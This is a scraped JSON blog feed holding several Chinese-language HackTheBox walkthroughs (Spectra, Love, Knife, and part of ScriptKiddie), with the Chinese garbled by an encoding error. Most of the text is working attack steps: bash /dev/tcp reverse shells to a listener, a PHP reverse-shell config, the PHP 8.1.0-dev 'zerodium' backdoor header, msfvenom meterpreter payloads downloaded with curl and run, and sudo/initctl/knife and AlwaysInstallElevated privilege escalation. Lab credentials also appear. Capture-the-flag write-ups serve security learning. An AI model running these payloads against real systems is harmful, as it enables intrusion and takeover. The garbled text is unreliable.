åˆ°å¤„ç‚¹äº†ä¸€ä¸‹ä¼¼ä¹æ²¡æœ‰å¯ç”¨çš„ä¸œè¥¿ï¼Œå’±ä»¬çœ‹çœ‹å¦ä¸€ä¸ªè¿æ¥ å»ºç«‹æ•°æ®è¿æ¥é”™è¯¯ï¼Œæ—¢ç„¶æç¤ºè¿™ä¸ªï¼Œåˆå¼€å¯äº†3306ç«¯å£ï¼Œé‚£ä¹ˆåé¢ä¼°è®¡æ˜¯ä¸€å®šä¼šç”¨åˆ°çš„ï¼Œå’±ä»¬å…ˆè®°å½•ä¸€ä¸‹ï¼Œåé¢å¾ˆæœ‰å¯èƒ½ä¼šç”¨åˆ°ï¼Œç„¶åæŠŠçœ¼å…‰æ”¾å›ç¬¬ä¸€ä¸ªé¡µé¢ å’±ä»¬ç›®å‰æ€è·¯å¡å£³äº†ï¼Œä¸çŸ¥é“åšä»€ä¹ˆäº†ï¼Œé‚£å°±æ‰«æä¸€ä¸‹ç›®å½•å§ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨dirbusterå·¥å…·è¿›è¡Œç›®å½•çˆ†ç ´å§ å¯¼å…¥åæŒ‰startå¯åŠ¨æ‰«æ æ‰«æçš„åŒæ—¶æˆ‘ä¹Ÿåœ¨æŒ¨ä¸ªçœ‹ï¼Œå‘ç°&#x2F;testing&#x2F;ç›®å½•ä¸‹å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œå’±ä»¬è¿›å…¥çœ‹çœ‹ è¿›æ¥åå‘ç°åˆä¸€äº›phpæ–‡ä»¶ï¼Œçœ‹æ–‡ä»¶åä¼¼ä¹è¿˜æœ‰é…ç½®æ–‡ä»¶ï¼Œå’±ä»¬æŒ¨ä¸ªæŸ¥çœ‹ä¸€ä¸‹ åœ¨ä¸€åœˆæ–‡ä»¶æŸ¥çœ‹ä¸‹æ¥åéƒ½æ²¡æœ‰çœ‹åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†åœ¨æ–‡ä»¶wp-config.php.saveçš„æ—¶å€™ï¼Œç‚¹è¿›å»å´æ˜¯ç©ºç™½é¡µé¢ï¼Œä½†æ–‡ä»¶å¤§å°å¤„å´åˆæ˜ç¡®æ˜¾ç¤ºæ˜¯æœ‰å†…å®¹çš„ï¼Œè¿™ä¸€ç‚¹å¼•èµ·äº†æˆ‘çš„æ³¨æ„ å’±ä»¬çœ‹ä¸€ä¸‹ç½‘é¡µæºä»£ç  å’±ä»¬å±…ç„¶åœ¨è¿™æ‰¾åˆ°äº†æ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œçœ‹æ¥è¿æ°”è¿˜æ˜¯ä¸é”™çš„ db_name &#x3D; dev db_user &#x3D; devtest db_password &#x3D; devteam01 æ¼æ´åˆ©ç”¨ è¿™é‡Œæ—¢ç„¶æ‹¿åˆ°äº†æ•°æ®åº“è´¦å·å¯†ç ï¼Œåˆå¼€å¯äº†3306ç«¯å£ï¼Œå’±ä»¬è‡ªç„¶æ˜¯å°è¯•è¿›è¡Œç™»å½•äº† mysql â€“host 10.10.10.229 â€“user devtest â€“password devteam01 -D dev ä½†æ˜¯è¿™é‡Œå´æ˜¾ç¤ºç™»å½•å¤±è´¥ï¼Ÿä¸å…è®¸è¿æ¥åˆ°è¿™ä¸ªæ•°æ®åº“ å—¯ã€‚ã€‚ã€‚çœ‹æ¥æœç„¶æ²¡æˆ‘æƒ³çš„é‚£ä¹ˆç®€å•å•Šï¼Œé‚£ä¹ˆç°åœ¨å”¯ä¸€ç”¨å¾—åˆ°è´¦å·å¯†ç çš„ï¼Œå°±åªæœ‰wordpressäº†ï¼Œå’±ä»¬åªèƒ½ä»è¿™é‡Œç»§ç»­å…¥æ‰‹äº† http://spectra.htb/main/wp-login.php å’±ä»¬è¿›è¡Œç™»å½• ç›´æ¥ä½¿ç”¨ä¹‹å‰è·å–åˆ°çš„æ•°æ®åº“è´¦å·devtestè¿›è¡Œç™»å½•å´æç¤ºæ²¡æœ‰è¿™ä¸ªè´¦å· çœ‹æ¥æœç„¶æ²¡æœ‰æˆ‘æƒ³çš„é‚£ä¹ˆç®€å•ï¼Œæˆ‘å¤§æ„äº†ï¼Œæ²¡æœ‰é—ª å¥½åœ¨è¿™ä¸ªæ—¶å€™ï¼Œçªç„¶çµæ„Ÿä»å¤©è€Œé™ï¼Œå‘ç°ä¸»é¡µæœ‰ä¸€ç¯‡æ–‡ç« ï¼Œæœ€ç»å…¸çš„ä¸€å¥â€œhello worldâ€ï¼Œbut å’±ä»¬çš„é‡ç‚¹ä¸åœ¨è¿™é‡Œï¼Œè€Œæ˜¯åœ¨å‘å¸–äººï¼Œadministrator å¥½å®¶ä¼™ï¼Œè¿™ä¸å°±æœ‰ç”¨æˆ·åäº†å˜›ï¼Ÿè€Œä¸”åŒæ—¶å’±ä»¬nmapæ²¡æœ‰è¯†åˆ«å‡ºæ“ä½œç³»ç»Ÿï¼Œçœ‹åˆ°è¿™ä¸ªå°±å¯ä»¥æ€€ç–‘æ˜¯windowsäº† å’±ä»¬ä½¿ç”¨è´¦æˆ·administrator å¯†ç devteam01è¿›è¡Œç™»å½•ï¼ŒæˆåŠŸè¿›å…¥åå° å¹¶ä¸”è·å–åˆ°wordpressçš„ç‰ˆæœ¬ä¸º5.4.2 æ‹¿åˆ°ç‰ˆæœ¬äº†ï¼Œå°±å¯ä»¥ä½¿ç”¨å·²çŸ¥æ¼æ´è¿›è¡Œæ”»å‡»äº† å’±ä»¬è¿™é‡Œæœ‰ä¸‰ç§åŠæ³•è·å¾—shell ç¬¬ä¸€ç§ï¼š ä½¿ç”¨msfè¿›è¡Œè´Ÿè½½æ”»å‡» use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_admin_shell_upload set USERNAME administrator set PASSWORD devteam01 set TARGETURI &#x2F;main set rhosts 10.10.10.229 set lhost 10.10.14.135 exploit nice æˆåŠŸè·å–åˆ°ä¸€ä¸ªshell ç¬¬äºŒç§ï¼š ä¿®æ”¹404é¡µé¢è¿›è¡Œåå¼¹shell é¦–å…ˆæœ¬åœ°ä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 5555 ç„¶åå’±ä»¬ç™»å…¥åˆ°ç½‘ç«™åå° ä¿®æ”¹404é¡µé¢çš„æºç  å’±ä»¬æ’å…¥æ¶æ„ä»£ç  ä¸‹è½½åœ°å€ http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz å…¶ä¸­éœ€è¦ä¿®æ”¹çš„å†…å®¹ set_time_limit (0); $VERSION &#x3D; â€œ1.0â€; $ip &#x3D; â€˜10.10.14.135â€™; &#x2F;&#x2F; CHANGE THIS $port &#x3D; 5555; &#x2F;&#x2F; CHANGE THIS $chunk_size &#x3D; 1400; $write_a &#x3D; null; $error_a &#x3D; null; $shell &#x3D; â€˜uname -a; w; id; &#x2F;bin&#x2F;sh -iâ€™; $daemon &#x3D; 0; $debug &#x3D; 0; ç„¶åç‚¹å‡»ä¿å­˜ å•Šè¿™ï¼Œå¥½åƒå¤±è´¥äº†ï¼Œè¯¸ä½ç­‰æˆ‘ç¨ç¨ç ”ç©¶ä¸€ä¸‹ å¥½äº†ï¼Œç»è¿‡æµ‹è¯•ï¼Œå’±ä»¬å°†æ¨¡æ¿è®¾ç½®ä¸ºTwenty Seventeå°±å¯ä»¥ä¿å­˜äº† ç„¶åå’±ä»¬è®¿é—®404é¡µé¢ http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php æˆåŠŸåå¼¹å›shell ç¬¬ä¸‰ç§ï¼š ç¬¬ä¸‰ç§å°±æ˜¯åˆ©ç”¨æ’ä»¶ä¸Šä¼ çš„æ¼æ´ï¼Œç„¶åä½¿ç”¨msfæ¥è¿›è¡Œshellçš„æ¥æ”¶ï¼Œè¿™ä¸ªæ­¥éª¤å’±ä»¬ä¸å¦‚ç›´æ¥ç¬¬ä¸€æ­¥äº†ï¼Œæœ‰ç‚¹å¤šæ­¤ä¸€ä¸¾ï¼Œæœ‰å…´è¶£çš„æœ‹å‹å¯ä»¥è‡ªå·±è¿›è¡Œç ”ç©¶ exploitåœ°å€ https://www.exploit-db.com/exploits/36374 msfè®¾ç½® use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_slideshowgallery_upload set rhosts 192.168.1.101 set targeturi &#x2F;wordpress exploit execï¼ˆâ€œ &#x2F; bin &#x2F; bash -câ€™bash -i&gt;ï¼†&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;ï¼†1â€™â€ï¼‰ å‚è€ƒè¿æ¥ https://www.hackingarticles.in/wordpress-reverse-shell/ æƒé™æå‡ å’±ä»¬é¦–å…ˆä½¿ç”¨python3è·å–ä¸€ä¸ªæ›´åŠ ç¨³å®šçš„shell python3 -c â€˜import pty; pty.spawn(â€œ&#x2F;bin&#x2F;bashâ€)â€™ æˆ‘ä»¬åœ¨ç¿»æ‰¾æ–‡ä»¶çš„æ—¶å€™ï¼Œåœ¨optç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ªautologin.conf.origæ–‡ä»¶ catæŸ¥çœ‹åï¼Œå‘ç°æ˜¯æœ‰ä¸ªè‡ªåŠ¨ç™»å½•çš„è„šæœ¬ï¼ŒæŒ‡å‘äº†&#x2F;etc&#x2F;autologin å’±ä»¬è¿‡å»çœ‹çœ‹ å‘ç°äº†ä¸€ä¸ªpasswdæ–‡ä»¶ï¼Œå’±ä»¬catæŸ¥çœ‹ å¾—åˆ°äº†ä¸€ä¸ªå¯†ç  SummerHereWeCome!! ç»è¿‡æµ‹è¯•å¹¶ç»“åˆå’±ä»¬æ‰¾flagä»¥åŠç¿»ç›®å½•çš„æ—¶å€™å¾—åˆ°çš„æ¶ˆæ¯æ¥çœ‹ï¼Œä¼¼ä¹æ˜¯ç”¨æˆ·katieçš„ æ­£å¥½å¼€å¯äº†22ç«¯å£ï¼Œå’±ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½• ssh &#x6b;&#x61;&#116;&#105;&#x65;&#64;&#49;&#48;&#x2e;&#x31;&#x30;&#46;&#49;&#x30;&#46;&#50;&#x32;&#57; æˆåŠŸç™»å½• æˆåŠŸè·å¾—useræƒé™çš„flag ä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹å’±ä»¬çš„sudoæƒé™ å‘ç°å’±ä»¬å¯ä»¥æ‰§è¡Œ&#x2F;sbin&#x2F;initctl è¿™ä¸ªæƒé™æ˜¯æŸ¥çœ‹å’±ä»¬å¯ç¼–è¾‘çš„æœåŠ¡ sudo initctl list å¯ç¼–è¾‘çš„æœåŠ¡æŒºå¤šçš„ï¼Œæˆ‘å°±ä¸å…¨éƒ¨æˆªå›¾äº†ï¼Œç„¶åå’±ä»¬è¿›è¡Œç­›é€‰æŸ¥çœ‹ å’±ä»¬åœ¨æœ€åé¢çœ‹åˆ°ä¸€ä¸ªåä¸ºtest2çš„æœªè¿è¡Œä¸”å¯ç¼–è¾‘çš„æœåŠ¡ï¼Œå«è¿™ä¸ªåå­—é‚£å°±è‚¯å®šä¸ä¸€èˆ¬äº†ï¼Œå’±ä»¬look lookï¼Œæ‰€æœ‰çš„æœåŠ¡éƒ½åœ¨&#x2F;etc&#x2F;initç›®å½•ä¸‹ è¿™ä¹ˆå¤štestçš„æœåŠ¡ï¼Œå’±ä»¬å°±ä»test.confå¼€å§‹lookå§ cat &#x2F;etc&#x2F;init&#x2F;test.conf å—¯ã€‚ã€‚ã€‚åœ¨è¿™é‡Œæ­£åœ¨è¿è¡Œä¸€ä¸ªnodejsçš„æ–‡ä»¶ nodetest.js å’±ä»¬ä¹Ÿå»look look cat &#x2F;srv&#x2F;nodetest.js å’±ä»¬å°†æ¶æ„ä»£ç æ›¿æ¢åˆ°test.confé‡Œï¼Œç„¶åæ‰§è¡Œè¿›è¡Œææƒå§ï¼Œå…¶å®ä¹Ÿå¯ä»¥æ›´æ”¹nodetest.jsçš„æ–‡ä»¶è¿›è¡Œncåå¼¹å¹¶ææƒï¼Œä½†æ˜¯å¥½éº»çƒ¦å•Šï¼Œæˆ‘å°±ç»™å„ä½ä¸€ä¸ªå›¾ï¼Œå¤§å®¶æœ‰å…´è¶£çš„è‡ªå·±ç ”ç©¶å§ï¼Œæˆ‘ä½¿ç”¨ç¬¬äºŒç§åŠæ³•ï¼Œç›´æ¥ä¿®æ”¹test.confçš„å†…å®¹å§ ç¬¬ä¸€ç§ï¼š ç¬¬äºŒç§ï¼š nano &#x2F;etc&#x2F;init&#x2F;test.conf æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯ææƒ sudo &#x2F;sbin&#x2F;initctl start test ä½¿ç”¨sudoæƒé™å¯åŠ¨testæœåŠ¡ ls -l &#x2F;bin&#x2F;bash æŸ¥çœ‹&#x2F;bin&#x2F;bashå³å¯å‘ç°æˆ‘ä»¬çš„SUIDå·²ç»ä¼ é€’ç»™rootç”¨æˆ· &#x2F;bin&#x2F;bash -p ææƒ ææƒæˆåŠŸ æˆåŠŸè·å¾—rootæƒé™çš„flag å®Œäº‹å„¿æ”¶å·¥ç¡è§‰","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Love - Hackthebox","slug":"Hackthebox - Love","date":"2021-05-26T11:38:36.000Z","updated":"2023-05-20T01:58:20.000Z","comments":true,"path":"2021/05/26/Hackthebox - Love/","link":"","permalink":"http://www.lucifiel.com/2021/05/26/Hackthebox%20-%20Love/","excerpt":"","text":"Hackthebox - Loveé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapé¦–å…ˆä½¿ç”¨nmapè¿›è¡ŒåŸºæœ¬çš„ç«¯å£æ¢æµ‹ Nmap -A -sS -sV -sC 10.10.10.239 Nmapæ¢æµ‹åˆ°å¼€å¯äº†80ã€135ã€139ã€443ã€445ã€3306ã€5000ã€5040ã€5985ã€5986ã€47001ã€49664-49670ä¹‹é—´çš„ç«¯å£ï¼Œå…¶ä¸­80å’Œ443è¿˜æœ‰5000ä¸ºwebæœåŠ¡ Nmapæ¢æµ‹å‘ç° 443ç«¯å£çš„sslè¯ä¹¦ä¸Šæç¤ºäº†ä¸¤ä¸ªåŸŸåï¼Œ åˆ†åˆ«ä¸ºlove.htbä»¥åŠstaging.love.htb æˆ‘ä»¬é€šè¿‡ä¿®æ”¹hostsæ–‡ä»¶æŒ‡å®šè¿™ä¸¤ä¸ªåŸŸåè§£æçš„IPä¸ºé¶åœºçš„IP 10.10.10.239 Vim /etc/hosts Httpæˆ‘ä»¬è®¿é—®5000ç«¯å£çœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿ æç¤ºæˆ‘ä»¬æ²¡æœ‰è®¿é—®çš„æƒé™ï¼Œé‚£å°±å…ˆä¸ç®¡è¿™ä¸ªï¼Œæˆ‘ä»¬å»çœ‹çœ‹80ç«¯å£ 80ç«¯å£æœ‰ä¸€ä¸ªç™»å½•æ¡† é€šè¿‡æœç´¢voting systemç³»ç»Ÿå‘ç°æ˜¯å­˜åœ¨æ³¨å…¥çš„ æ¼æ´å‚è€ƒåœ°å€ https://www.exploit-db.com/exploits/49817 https://www.exploit-db.com/exploits/49846 æˆ‘ä»¬æŠ“ä¸ªåŒ…æ¥æ³¨å…¥ä¸€æ³¢ å°†æŠ“åˆ°çš„æ•°æ®åŒ…ä¿å­˜åœ¨æœ¬åœ°ï¼Œä½¿ç”¨sqlmapè¿›è¡Œæ³¨å…¥ æ²¡æœ‰æ³¨å…¥å‡ºæ¥ï¼Œæˆ‘ä»¬æ”¾å¼ƒè¿™ä¸ªæ€è·¯ï¼Œæ¥çœ‹çœ‹ç¬¬äºŒä¸ªåŸŸå æ¼æ´åˆ©ç”¨ http://staging.love.htb/ è¿›å…¥è¯¥é¡µé¢åï¼Œæœ‰ä¸¤ä¸ªå¯ç‚¹å‡»çš„æŒ‰é’®ï¼Œåˆ†åˆ«æ˜¯Homeå’ŒDemo Homeæ˜¯ä¸€ä¸ªç™»é™†å£ï¼Œæˆ–è®¸æœ‰æ³¨å…¥ï¼Œä½†å…ˆçœ‹çœ‹å…¶ä»–åŠŸèƒ½ ç‚¹å‡»Demoï¼Œè¿›å…¥è¿™ä¸ªé¡µé¢ ä¼¼ä¹æ˜¯ä¸€ä¸ªæ‰«æå™¨ï¼Œå’±ä»¬éšä¾¿æ‰«æä¸€ä¸ªé¡µé¢è¯•è¯• éšä¾¿æ‰«æäº†ä¸€ä¸ªé¡µé¢ï¼Œæ²¡æœ‰ä»€ä¹ˆååº”ï¼Œæ€è·¯åˆ°è¿™é‡Œå°±å¡å£³äº†å‘€ã€‚ åœ¨æ‰“äº†ä¸€æŠŠLOLè¢«é˜Ÿå‹å‘äº†åï¼Œçªç„¶æ¥äº†æ€è·¯ æˆ‘ä»¬ä¸æ˜¯æœ‰ä¸€ä¸ªæ— æƒé™è®¿é—®çš„5000ç«¯å£å—ï¼Œé‚£è®©å®ƒè‡ªå·±å‘å‡ºè®¿é—®è¯·æ±‚ï¼Œæ˜¯å¦å°±æœ‰æƒé™äº†ï¼Ÿè¯´å¹²å°±å¹² å¼¹å‡ºäº†å¦‚ä¸‹é¡µé¢ è¿™æ—¶å€™æˆ‘ä»¬å°±æ‹¿åˆ°å¯†ç äº†è´¦å·å’Œå¯†ç  è´¦å·admin å¯†ç @LoveIsInTheAir!!!! ç„¶åæˆ‘ä»¬å»ç™»å½• æç¤ºæ‰¾ä¸åˆ°è¿™ä¸ªIDï¼Ÿè¿™ä¸å¯¹åŠ²å•Šå…„å¼Ÿ å’±ä»¬å»æ‰¾ä¸€ä¸‹è¿™ä¸ªcms ç»è¿‡æœç´¢åï¼Œæ‰¾åˆ°äº†è¯¥cmsçš„æºç  æ‚¨çŒœæ€ä¹ˆç€ï¼Ÿè¿˜çœŸè®©æˆ‘æ‰¾åˆ°äº†å“å˜¿ https://www.sourcecodester.com/php/12306/voting-system-using-php.html è¿™æ˜¯å’±ä»¬æ‰¾åˆ°çš„cmsæºç  å…¶ä¸­çœ‹åˆ°äº†ä¸€ä¸ªä½¿ç”¨æ•™ç¨‹ æ ¹æ®æç¤ºï¼Œåå°ç™»å½•é¡µé¢åœ¨&#x2F;admin&#x2F;ä¸‹ï¼Œè¿™ä¸ªindex.phpå°±æ˜¯ç”¨æ¥è¿·æƒ‘å’±ä»¬çš„ï¼Œæˆ‘ç›´æ¥å¥½å®¶ä¼™ å’±ä»¬è®¿é—®&#x2F;admin&#x2F;ç›®å½•è¿›è¡Œç™»å½• æˆ‘ç›´æ¥å¥½å®¶ä¼™ï¼Œå’±ä»¬ç”¨è´¦å·å¯†ç è¿›è¡Œç™»å½• æ€»ç®—æ˜¯æ’é™¤ä¸‡éš¾è¿›å…¥åå°äº† è¿™é‡Œå’±ä»¬ä½¿ç”¨Votersæ¥è¿›è¡Œgetshell åˆ›å»ºä¸€ä¸ªæ–°é€‰æ°‘ åœ¨photoå¤„ä¼ å…¥æˆ‘ä»¬çš„shellæˆ–æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œè¿›å…¥ http://love.htb/images æŸ¥çœ‹æˆ‘ä»¬çš„shellæ˜¯å¦ä¸Šä¼ ä¸Šå» å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„shellå·²ç»ä¸Šä¼ ä¸Šå»äº†ï¼Œå’±ä»¬è¿›å…¥shell OK å’±ä»¬æˆåŠŸè·å¾—äº†ä¸€ä¸ªäº¤äº’å¼shellï¼Œä½†æ¯•ç«Ÿä¸æ˜¯ä¸€ä¸ªç¨³å®šçš„shellï¼Œå’±ä»¬æ¥ä¸‹æ¥æƒ³åŠæ³•è·å¾—ä¸€ä¸ªç¨³å®šçš„shellï¼Œå¹¶ä¸”å› ä¸ºæŸäº›è„šæœ¬çš„åŸå› ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„webshellå¯èƒ½ä¼šè¢«åˆ é™¤ å’±ä»¬ä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªexeçš„æœ¨é©¬ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.135 LPORT=4444 -f exe &gt; shell.exe ä½¿ç”¨msfconsoleè¿›è¡Œç›‘å¬ use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 10.10.14.135 set LPORT 4444 exploit ç„¶åæˆ‘ä»¬æœ¬åœ°ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡ python3 -m http.server 80 ç„¶ååœ¨shellé‡Œä½¿ç”¨curlè¿›è¡Œä¸‹è½½ Curl [http://10.10.14.135/shell.exe -o shell.exe](http://10.10.14.135/shell.exe%20-o%20shell.exe) OKï¼ŒæˆåŠŸä¸‹è½½ä¸‹æ¥äº†ï¼Œå’±ä»¬ç›´æ¥è¿è¡Œè¯¥æœ¨é©¬ è¿è¡ŒåæˆåŠŸå¼¹å›äº†shell æˆ‘ä»¬æˆåŠŸè·å¾—ç¬¬ä¸€ä¸ªflag æƒé™æå‡æ‰¾åˆ°alwaysinstallelevatedï¼Œå³å½“æ³¨å†Œè¡¨ä¸­çš„alwaysinstallelevatedè®¾ç½®ä¸º1æ—¶ï¼Œæœºå™¨ä¸Šè¿è¡Œä»»ä½•çš„msiç¨‹åºï¼Œå‡ä¼šä»¥systemæƒé™æ‰§è¡Œï¼Œæˆ‘ä»¬åªéœ€ç”Ÿæˆä¸€ä¸ªmsiçš„æœ¨é©¬ç¨‹åºå³å¯ææƒã€‚ æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹alwaysinstallelevatedçš„è®¾ç½® reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer ç»“æœå‡ä¸º0x1ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨è¯¥æ¼æ´ ä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªmsié©¬ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.135 LPORT=5555 -f msi &gt; shell.msi å†å•ç‹¬å¼€ä¸€ä¸ªmsfconsoleè¿›è¡Œç›‘å¬ use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 10.10.14.135 set LPORT 5555 exploit ç„¶åä¸Šä¼ æˆ‘ä»¬çš„msié©¬ æˆåŠŸä¸Šä¼  ç„¶ååœ¨ä¹‹å‰è·å–çš„shellä¸­è¾“å…¥æŒ‡ä»¤shellå³å¯è¿›å…¥shellï¼ˆç»•å£ä»¤ï¼Ÿï¼‰ ä½¿ç”¨msiexec &#x2F;quiet &#x2F;qn &#x2F;i shell.msiè¿è¡Œmsié©¬ /quiet = Suppress any messages to the user during installation /qn = No GUI /i = Regular (vs. administrative) installation ææƒæˆåŠŸ æˆåŠŸè·å–åˆ°ç®¡ç†å‘˜æƒé™çš„shell","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Knife - Hackthebox","slug":"Hackthebox - Knife","date":"2021-05-24T11:38:36.000Z","updated":"2023-05-20T01:55:42.000Z","comments":true,"path":"2021/05/24/Hackthebox - Knife/","link":"","permalink":"http://www.lucifiel.com/2021/05/24/Hackthebox%20-%20Knife/","excerpt":"","text":"Hackthebox - Knifeé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapé¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ æˆ‘ä»¬å¾—çŸ¥å¼€å¯äº†22å’Œ80ç«¯å£ å‡ºäºèƒ½ä¸çˆ†ç ´å°±ä¸çˆ†ç ´çš„åŸåˆ™ï¼Œå…ˆè®¿é—®80ç«¯å£çœ‹ä¸€ä¸‹ Http 80ç«¯å£ä¸Šçš„å†…å®¹æœ‰ç‚¹ä¸æ˜æ‰€ä»¥ã€‚ åœ¨å®Œå…¨æ²¡æ€è·¯çš„æƒ…å†µä¸‹ï¼Œå°è¯•ä½¿ç”¨dirbusterå·¥å…·è¿›è¡Œäº†ç›®å½•çˆ†ç ´ï¼Œä½†å››ååˆ†é’Ÿè¿‡å»äº†å´æ²¡æœ‰ä¸€ä¸ç‚¹æ”¶è·ï¼Œè¿robots.txté¡µé¢ä¹Ÿä¸å­˜åœ¨ã€‚ æˆ‘çš„æ€è·¯å°±å¡åœ¨è¿™é‡Œäº†ï¼Œä¸€æ—¶ä¹‹é—´ä¸çŸ¥é“åº”è¯¥æ€ä¹ˆåšï¼Œå°±å»æ³¡äº†æ¯èŒ¶ï¼Œçªç„¶æ¥äº†çµæ„Ÿï¼Œè¦ä¸å…ˆæŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Ÿ ä¹ä¸€çœ‹ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆå€¼å¾—å…³æ³¨çš„ä¸œè¥¿ï¼Œä½†åœ¨é€šå®µæ—¥é¶åœºå¯¼è‡´ç¥å¿—ä¸æ¸…åˆç»è¿‡äº†èŒ¶å¶æ´—ç¤¼çš„è„‘ç“œå­çš„å¼•å¯¼ä¸‹ï¼Œæˆ‘æ³¨æ„åˆ°äº†ä¸€ä¸ªç‚¹ã€‚ X-Powered-By: PHP/8.1.0-dev è¿™ä¸œè¥¿ï¼Œéšçº¦ä¹‹é—´è§‰å¾—ä¸ç®€å•ï¼Œä¾¿å»ç™¾åº¦è¿›è¡Œäº†æœç´¢ã€‚æœç´¢çš„åŒæ—¶å°è¯•äº†niktoå·¥å…·ï¼Œä¹Ÿæç¤ºäº†è¿™ä¸€æ¡ å°±æ˜¯è¿™ä¸¤ä¸ªæç¤ºï¼Œè®©æˆ‘ç¡®ä¿¡çªç ´å£åœ¨è¿™ï¼Œç„¶åç»è¿‡å¤§é‡çš„googleå’Œç™¾åº¦æœç´¢åï¼Œæ‰¾åˆ°äº†ä¸€ä¸æ€è·¯ã€‚ PHP 8.1.0-dev ç‰ˆæœ¬åœ¨2021å¹´3æœˆ28æ—¥è¢«æ¤å…¥åé—¨ï¼Œä½†æ˜¯åé—¨å¾ˆå¿«è¢«å‘ç°å¹¶æ¸…é™¤ã€‚å½“æœåŠ¡å™¨å­˜åœ¨è¯¥åé—¨æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€User-Agenttå¤´æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚ æ¼æ´åˆ©ç”¨ ä½¿ç”¨burpæŠ“åŒ…ï¼Œå¹¶åŠ å…¥å­—æ®µ User-Agentt: zerodiumvar_dump(2*3); å‘ç°è¢«æˆåŠŸæ‰§è¡Œ æ¥ç€å°è¯•å‘½ä»¤æ˜¯å¦å¯è¢«è§£ææ‰§è¡Œ User-Agentt: zerodiumsystem(&quot;id&quot;); Nice å‘½ä»¤å¯è¢«æ‰§è¡Œï¼Œé‚£å°±ç®€å•äº†ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£å°±å°è¯•getshellå§ æœ¬åœ°ç›‘å¬ï¼š Nc â€“nvlp 9001 æ‰§è¡Œå‘½ä»¤ï¼š User-Agentt: zerodiumsystem(&quot;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.240/9001 0&gt;&amp;1&#39;&quot;); æˆåŠŸé€šè¿‡ncè·å¾—äº†ä¸€ä¸ªshell é¦–å…ˆç¡®å®šæ˜¯å¦æœ‰python Which python3 ç¡®å®špython3å­˜åœ¨ï¼Œä½¿ç”¨python3è·å¾—ä¸€ä¸ªäº¤äº’å¼ shell ç¨‹åº python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; æˆåŠŸè·å¾—æ™®é€šç”¨æˆ·çš„flag æƒé™æå‡å…ˆç¡®å®šknifeç”¨æˆ·çš„sudoæƒé™ Sudo â€“l Ls â€“al /usr/bin/knife è¿›è¡Œææƒ echo &quot;system(&#39;chmod +s /bin/bash&#39;)&quot; &gt; exploit.rb ls sudo /usr/bin/knife exec exploit.rb ls -al /bin/bash /bin/bash â€“p è·å¾—rootç”¨æˆ·çš„flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"ScriptKiddie - Hackthebox","slug":"Hackthebox - ScriptKiddie","date":"2021-05-24T11:38:36.000Z","updated":"2023-05-20T02:58:41.000Z","comments":true,"path":"2021/05/24/Hackthebox - ScriptKiddie/","link":"","permalink":"http://www.lucifiel.com/2021/05/24/Hackthebox%20-%20ScriptKiddie/","excerpt":"","text":"Hackthebox - ScriptKiddieHackthebox-ScriptKiddieé¶åœºå®æˆ˜ é¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›† å…ˆä½¿ç”¨nmapè¿›è¡Œæœ€åŸºæœ¬çš„ç«¯å£æ‰«æ nmap -A -sS -sV -sC 10.10.10.226 å‘ç°å¼€å¯äº†22ç«¯å£å’Œ5000ç«¯å£ï¼Œå†æ¬¡åŸºäºèƒ½ä¸çˆ†ç ´å°±ä¸çˆ†ç ´çš„åŸåˆ™ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹5000ç«¯å£ 5000ç«¯å£ä¸Šè¿è¡Œäº†Werkzeugï¼Œé€šè¿‡googleæœç´¢å‘ç°Werkzeugå­˜åœ¨Werkzeg debug 